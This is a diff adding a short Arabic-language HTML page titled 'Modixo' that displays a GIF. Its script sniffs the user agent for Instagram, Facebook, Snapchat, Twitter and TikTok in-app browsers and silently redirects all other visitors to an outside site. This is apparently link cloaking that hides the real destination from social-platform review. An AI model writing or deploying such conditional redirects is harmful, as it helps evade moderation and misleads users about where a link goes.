@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Modixo</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f0f0;
+        }
+        img {
+            max-width: 100%;
+            height: auto;
+        }
+    </style>
+</head>
+<body>
+    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjHhFZmTqAWzpDPDT2dYxwua6wth-C6N807IjtpNv19snj-rPEz8S0RFqfP6faxsdap6U3fYApuzw_Bx0o1zxAbQdBcxzCfs3HiqqGxYYrh0EAod56xb0azao7h0w1Oht4slFmaJcyINo53xyccAoJdn6VlRzrQz357u3SBa1-lsdTzgHYw0dre1v7m/s1920/Untitled%20Project.gif" alt="Image">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/0.7.31/ua-parser.min.js"></script>
+    <script>
+        function isSocialMediaBrowser() {
+            const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+            const socialMediaPatterns = [
+                /Instagram/i,
+                /Snapchat/i,
+                /FBAN/i, // Facebook App
+                /FBAV/i, // Facebook App
+                /Twitter/i,
+                /TikTok/i,
+                /Musical.ly/i // TikTok's previous name
+            ];
+
+            // Checking using patterns
+            const isSocialMedia = socialMediaPatterns.some(pattern => pattern.test(userAgent));
+
+            return isSocialMedia;
+        }
+
+        function redirectToLink() {
+            window.location.href = 'https://xrpsp.com/'; // رابط التحويل
+        }
+
+        // Check if the user is not using a social media browser
+        if (!isSocialMediaBrowser()) {
+            redirectToLink();
+        }
+    </script>
+</body>
+</html>
